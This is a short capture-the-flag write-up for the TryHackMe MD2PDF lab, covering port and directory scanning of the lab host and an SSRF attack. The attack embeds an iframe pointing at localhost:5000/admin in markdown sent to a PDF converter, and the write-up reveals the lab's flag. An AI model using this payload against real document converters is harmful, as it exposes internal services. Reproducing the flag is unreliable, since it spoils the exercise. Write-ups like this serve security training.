📚 [TryHackMe MD2PDF](https://tryhackme.com/room/md2pdf)


## setup

1. [Install nmap](https://github.com/TurboLabIt/cybersec/blob/main/notes/nmap.md)


## recon

[nmap scan (zznmap)](https://github.com/TurboLabIt/cybersec/blob/main/notes/nmap.md)

````shell
$ zznmap 10.67.148.193

...
Discovered open port 22/tcp
Discovered open port 80/tcp
Discovered open port 443/tcp
Discovered open port 5000/tcp
...
````


The main application at http://10.67.148.193 shows a textarea. The user can input some markdown and get back a PDF.

````html
<textarea class="form-control" name="md" id="md"></textarea>

<script>
    var editor = CodeMirror.fromTextArea(document.getElementById("md"), {
        mode: "markdown",
        lineNumbers: true,
        tabSize: 2,
        lineWrapping: true,
    });
    
    $("#convert").click(function () {
        const data = new FormData()
        data.append("md", editor.getValue())
        $("#progress").show()

        fetch("/convert", {
            method: "POST",
            body: data,
        })
                .then((response) => response.blob())
                .then((data) => window.open(URL.createObjectURL(data)))
                .catch((error) => {
                    $("#progress").hide()
                    console.log(error)
                })
    })
</script>
````

Let's try to GoBuster it:

````shell
$ gobuster dir -u 10.67.148.193 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
...
admin                (Status: 403) [Size: 166]
...
````

http://10.67.148.193/admin gives 403:

> Forbidden: This page can only be seen internally (localhost:5000)

There is also a copy of the application at http://10.67.148.193:5000 , but it has no CSS applied.

http://10.67.148.193:5000/admin also give 403.



## exploit

We can do a SSRF from the main application:

````html
<iframe src="http://localhost:5000/admin"></iframe>
````

We get the flag: `flag{1f4a2b6ffeaf4707c43885d704eaee4b}`
